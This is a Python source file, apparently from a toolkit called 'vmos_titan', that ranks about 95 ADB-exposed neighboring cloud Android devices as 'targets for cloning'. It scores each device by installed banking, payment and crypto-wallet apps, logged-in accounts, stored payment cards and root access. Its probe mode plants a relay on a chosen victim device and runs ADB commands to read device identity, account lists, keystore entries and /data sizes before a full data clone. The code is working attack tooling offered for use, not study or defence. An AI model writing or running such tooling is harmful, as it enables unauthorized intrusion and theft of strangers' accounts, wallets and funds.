#!/usr/bin/env python3
"""
Neighbor Selector v1.0
========================
Load scan data from 95 ADB-enabled neighbors, rank by value,
and select the best target for cloning.

Usage:
  python3 -m vmos_titan.core.neighbor_selector rank           # Show ranked targets
  python3 -m vmos_titan.core.neighbor_selector rescan         # Rescan missing hosts
  python3 -m vmos_titan.core.neighbor_selector probe <IP>     # Deep-probe a specific target
"""

from __future__ import annotations

import asyncio
import json
import os
import sys
import time
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Optional

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient
from vmos_titan.core.clone_engine import (
    AK, SK, DEVICES, RELAY_PORT, ADB_BRIDGE, API_DELAY,
    adb, adb_check, cloud_cmd, cloud_cmd_retry,
    deploy_relay, connect_relay, disconnect_relay, kill_relay,
)

SCAN_RESULTS = "tmp/harvest_scan.json"
HOSTS_FILE = "tmp/fullscan_hosts.txt"
SELECTOR_OUTPUT = "tmp/neighbor_ranking.json"

# High-value package database (name, score)
HIGH_VALUE_PKGS = {
    # Wallets & Payment
    "com.google.android.apps.walletnfcrel": ("Google Wallet/Pay", 15),
    "com.paypal.android.p2pmobile": ("PayPal", 12),
    "com.venmo": ("Venmo", 12),
    "com.squareup.cash": ("Cash App", 12),
    "com.revolut.revolut": ("Revolut", 12),
    "com.samsung.android.spay": ("Samsung Pay", 10),
    "com.zellepay.zelle": ("Zelle", 10),
    "com.klarna.android": ("Klarna", 8),
    "com.afterpay.android": ("Afterpay", 8),
    # Crypto
    "io.metamask": ("MetaMask", 20),
    "com.wallet.crypto.trustapp": ("Trust Wallet", 20),
    "app.phantom": ("Phantom Wallet", 20),
    "com.coinbase.android": ("Coinbase", 15),
    "com.binance.dev": ("Binance", 15),
    "com.robinhood.android": ("Robinhood", 12),
    "com.bitpay.wallet": ("BitPay", 12),
    "com.wemade.wemixplay": ("WEMIX Play", 10),
    "com.krakenfx.app": ("Kraken", 12),
    "piuk.blockchain.android": ("Blockchain.com", 12),
    "com.crypto.exchange": ("Crypto.com", 12),
    # Banking
    "com.chase.sig.android": ("Chase", 12),
    "com.wf.wellsfargo": ("Wells Fargo", 12),
    "com.bankofamerica.cashpro": ("Bank of America", 12),
    "com.usaa.mobile.android.usaa": ("USAA", 10),
    "com.capitalone.mobile": ("Capital One", 10),
    "com.citi.mobilebank": ("Citi", 10),
    "com.sofi.mobile": ("SoFi", 10),
    "com.chime.android": ("Chime", 10),
    "co.mona.android": ("Monzo", 10),
    "com.starlingbank.android": ("Starling", 10),
    "com.nubank.nubank": ("Nubank", 10),
    "com.n26.app": ("N26", 10),
    "com.transferwise.android": ("Wise", 10),
    "my.maya.android": ("Maya PH", 10),
    "com.globe.gcash.android": ("GCash PH", 10),
}


@dataclass
class RankedNeighbor:
    ip: str = ""
    rank: int = 0
    score: int = 0
    brand: str = ""
    model: str = ""
    android: str = ""
    high_value_apps: list = field(default_factory=list)
    high_value_names: list = field(default_factory=list)
    fintech_apps: list = field(default_factory=list)
    accounts: list = field(default_factory=list)
    account_count: int = 0
    payment_instruments: int = 0
    third_party_count: int = 0
    shell_access: str = ""
    clone_feasibility: str = ""


def load_scan_data() -> list[dict]:
    """Load existing scan results."""
    if not os.path.exists(SCAN_RESULTS):
        print(f"[!] No scan data at {SCAN_RESULTS}")
        print(f"    Run the neighborhood harvester first.")
        return []

    with open(SCAN_RESULTS) as f:
        data = json.load(f)

    scanned = [d for d in data if d.get("status") == "scanned"]
    print(f"  Loaded {len(scanned)} scanned devices from {SCAN_RESULTS}")
    return scanned


def rank_neighbors(scanned: list[dict]) -> list[RankedNeighbor]:
    """Rank neighbors by clone value."""
    ranked = []

    for d in scanned:
        n = RankedNeighbor(
            ip=d.get("ip", ""),
            score=d.get("score", 0),
            brand=d.get("brand", ""),
            model=d.get("model", ""),
            android=d.get("android", ""),
            high_value_apps=d.get("high_value", []),
            high_value_names=d.get("high_value_names", []),
            fintech_apps=d.get("fintech", []),
            accounts=d.get("accounts", []),
            account_count=len(d.get("accounts", [])),
            payment_instruments=d.get("payment_instruments_count", 0),
            third_party_count=len(d.get("third_party", d.get("all_pkgs", []))),
            shell_access=d.get("shell", "unknown"),
        )

        # Boost score for clonability factors
        clone_score = n.score
        # Bonus for root access (full /data/ backup possible)
        if n.shell_access == "root":
            clone_score += 5
        # Bonus for having accounts (indicates logged-in state)
        clone_score += n.account_count * 3
        # Bonus for payment instruments
        clone_score += n.payment_instruments * 5
        # Bonus for having Google account (most valuable for GMS state)
        has_google = any(a.get("type", "").startswith("com.google") for a in n.accounts)
        if has_google:
            clone_score += 5
        n.score = clone_score

        # Feasibility
        if n.shell_access == "root":
            n.clone_feasibility = "FULL (root → complete /data/ backup)"
        else:
            n.clone_feasibility = "PARTIAL (no root → app-level only)"

        ranked.append(n)

    ranked.sort(key=lambda x: x.score, reverse=True)
    for i, n in enumerate(ranked):
        n.rank = i + 1

    return ranked


def display_ranking(ranked: list[RankedNeighbor], top_n: int = 20):
    """Display ranked neighbors."""
    print(f"\n{'═'*80}")
    print(f"  NEIGHBOR RANKING — Top {min(top_n, len(ranked))} of {len(ranked)} scanned devices")
    print(f"{'═'*80}")

    for n in ranked[:top_n]:
        hv_names = n.high_value_names or [HIGH_VALUE_PKGS.get(p, (p,))[0] for p in n.high_value_apps]
        fin_label = f" + {len(n.fintech_apps)} fintech" if n.fintech_apps else ""
        acct_label = f" | {n.account_count} accts" if n.account_count else ""
        card_label = f" | {n.payment_instruments} cards" if n.payment_instruments else ""

        marker = ""
        if n.score >= 20:
            marker = " ★★★ TOP TARGET"
        elif n.score >= 15:
            marker = " ★★ HIGH VALUE"
        elif n.score >= 10:
            marker = " ★ NOTABLE"

        print(f"\n  {n.rank:2d}. {n.ip:18s} | {n.brand} {n.model}")
        print(f"      Score: {n.score} | Android {n.android} | Shell: {n.shell_access}")
        print(f"      Apps: {', '.join(hv_names)}{fin_label}{acct_label}{card_label}{marker}")
        print(f"      Feasibility: {n.clone_feasibility}")

        for a in n.accounts[:3]:
            print(f"      Account: {a.get('name', '?')} ({a.get('type', '?')})")

    # Summary
    root_count = sum(1 for n in ranked if n.shell_access == "root")
    with_accounts = sum(1 for n in ranked if n.account_count > 0)
    with_hv = sum(1 for n in ranked if n.high_value_apps)

    print(f"\n  {'─'*60}")
    print(f"  SUMMARY:")
    print(f"    Total scanned:     {len(ranked)}")
    print(f"    Root access:       {root_count} ({root_count*100//max(len(ranked),1)}%)")
    print(f"    With accounts:     {with_accounts}")
    print(f"    With high-value:   {with_hv}")
    print(f"    Best target:       {ranked[0].ip if ranked else 'none'}")
    print(f"{'═'*80}")


async def deep_probe_target(client: VMOSCloudClient, launchpad: str,
                            target_ip: str) -> dict:
    """Deep-probe a specific target before cloning."""
    print(f"\n{'═'*70}")
    print(f"  DEEP PROBE — {target_ip}")
    print(f"  Launchpad: {launchpad}")
    print(f"{'═'*70}")

    result = {"ip": target_ip, "status": "pending"}

    # Deploy relay
    if not await deploy_relay(client, launchpad, target_ip):
        print(f"  [!] Relay failed")
        result["status"] = "relay_failed"
        return result

    await asyncio.sleep(0.6)
    dev = connect_relay()
    await asyncio.sleep(0.5)

    test = adb(dev, "echo OK", 5)
    if "OK" not in test:
        print(f"  [!] ADB not responding")
        disconnect_relay()
        await kill_relay(client, launchpad)
        result["status"] = "adb_failed"
        return result

    # Shell level
    shell_id = adb(dev, "id", 5)
    is_root = "uid=0" in shell_id
    result["shell"] = "root" if is_root else "shell"
    print(f"\n  Shell: {'ROOT ✓' if is_root else 'NON-ROOT'}")

    # Full device identity
    result["brand"] = adb(dev, "getprop ro.product.brand", 5)
    result["model"] = adb(dev, "getprop ro.product.model", 5)
    result["android"] = adb(dev, "getprop ro.build.version.release", 5)
    result["fingerprint"] = adb(dev, "getprop ro.build.fingerprint", 5)
    result["serial"] = adb(dev, "getprop ro.serialno", 5)
    print(f"  Device: {result['brand']} {result['model']} (Android {result['android']})")
    print(f"  Fingerprint: {result['fingerprint']}")

    # Storage
    df = adb(dev, "df -h /data | tail -1", 5)
    result["storage"] = df
    print(f"  Storage: {df}")

    # Data sizes
    du = adb(dev, "du -sh /data/data/ /data/system_ce/0/ /data/misc/keystore/ /data/app/ 2>/dev/null", 20)
    result["data_sizes"] = du
    print(f"  Data sizes:")
    for line in du.splitlines():
        print(f"    {line}")

    # Accounts
    accts_raw = adb(dev, "dumpsys account 2>/dev/null | grep -E 'Account \\{|Accounts:' | head -20", 10)
    result["accounts_raw"] = accts_raw
    accounts = []
    for line in accts_raw.splitlines():
        if "name=" in line:
            try:
                name = line.split("name=")[1].split(",")[0]
                atype = line.split("type=")[1].rstrip("}").strip()
                accounts.append({"name": name, "type": atype})
            except (IndexError, ValueError):
                pass
    result["accounts"] = accounts
    print(f"  Accounts: {len(accounts)}")
    for a in accounts:
        print(f"    {a['name']} ({a['type']})")

    # Keystore
    ks = adb(dev, "ls /data/misc/keystore/user_0/ 2>/dev/null | wc -l", 5)
    result["keystore_count"] = int(ks.strip()) if ks.strip().isdigit() else 0
    print(f"  Keystore entries: {result['keystore_count']}")

    # High-value packages
    raw_pkgs = adb(dev, "pm list packages -3 | cut -d: -f2", 15)
    all_pkgs = [p.strip() for p in raw_pkgs.splitlines() if p.strip()]
    hv = [p for p in all_pkgs if p in HIGH_VALUE_PKGS]
    result["high_value_pkgs"] = hv
    result["third_party_count"] = len(all_pkgs)
    print(f"  Third-party: {len(all_pkgs)} packages")
    print(f"  High-value: {', '.join(HIGH_VALUE_PKGS.get(p, (p,))[0] for p in hv)}")

    # Estimated backup size
    est = adb(dev, "du -s /data/data/ /data/system_ce/ /data/misc/keystore/ /data/app/ 2>/dev/null | awk '{s+=$1} END {print s}'", 10)
    try:
        est_kb = int(est.strip())
        est_mb = est_kb / 1024
        result["estimated_backup_mb"] = round(est_mb, 1)
        print(f"  Estimated backup size: {est_mb:.0f} MB (before compression)")
    except (ValueError, AttributeError):
        result["estimated_backup_mb"] = 0

    # Clone recommendation
    print(f"\n  {'─'*50}")
    print(f"  CLONE ASSESSMENT:")
    if is_root and len(accounts) > 0 and len(hv) > 0:
        result["recommendation"] = "EXCELLENT — root + accounts + high-value apps"
        print(f"    ★★★ EXCELLENT — Full /data/ clone possible, accounts present")
    elif is_root and len(hv) > 0:
        result["recommendation"] = "GOOD — root + high-value apps, no active accounts visible"
        print(f"    ★★ GOOD — Full /data/ clone possible")
    elif is_root:
        result["recommendation"] = "FAIR — root access but no high-value apps"
        print(f"    ★ FAIR — Full clone possible but low value")
    else:
        result["recommendation"] = "LIMITED — no root access"
        print(f"    ⚠ LIMITED — no root → partial clone only")

    disconnect_relay()
    await kill_relay(client, launchpad)

    result["status"] = "probed"

    # Save
    os.makedirs("tmp", exist_ok=True)
    with open(f"tmp/probe_{target_ip.replace('.', '_')}.json", "w") as f:
        json.dump(result, f, indent=2)
    print(f"\n  Probe saved to tmp/probe_{target_ip.replace('.', '_')}.json")

    return result


async def main():
    if len(sys.argv) < 2:
        print("""
Neighbor Selector v1.0
========================

Usage:
  python3 -m vmos_titan.core.neighbor_selector rank             # Show ranked targets
  python3 -m vmos_titan.core.neighbor_selector top               # Show top 5 targets
  python3 -m vmos_titan.core.neighbor_selector probe <IP>        # Deep-probe a target
""")
        sys.exit(1)

    action = sys.argv[1].lower()

    if action in ("rank", "top"):
        scanned = load_scan_data()
        if not scanned:
            sys.exit(1)
        ranked = rank_neighbors(scanned)
        top_n = 5 if action == "top" else 20
        display_ranking(ranked, top_n)

        # Save ranking
        os.makedirs("tmp", exist_ok=True)
        with open(SELECTOR_OUTPUT, "w") as f:
            json.dump([asdict(n) for n in ranked], f, indent=2)
        print(f"\n  Full ranking saved to {SELECTOR_OUTPUT}")

    elif action == "probe":
        if len(sys.argv) < 3:
            print("Usage: ... probe <IP>")
            sys.exit(1)
        target_ip = sys.argv[2]

        client = VMOSCloudClient(ak=AK, sk=SK, base_url="https://api.vmoscloud.com")

        # Pick first alive device as launchpad
        from vmos_titan.core.clone_engine import probe_all_devices
        probes = await probe_all_devices(client)
        launchpad = None
        for pad, p in probes.items():
            if p.alive:
                launchpad = pad
                break
        if not launchpad:
            print("[!] No device responding")
            sys.exit(1)

        await deep_probe_target(client, launchpad, target_ip)
        await client.close()

    else:
        print(f"Unknown action: {action}")
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())
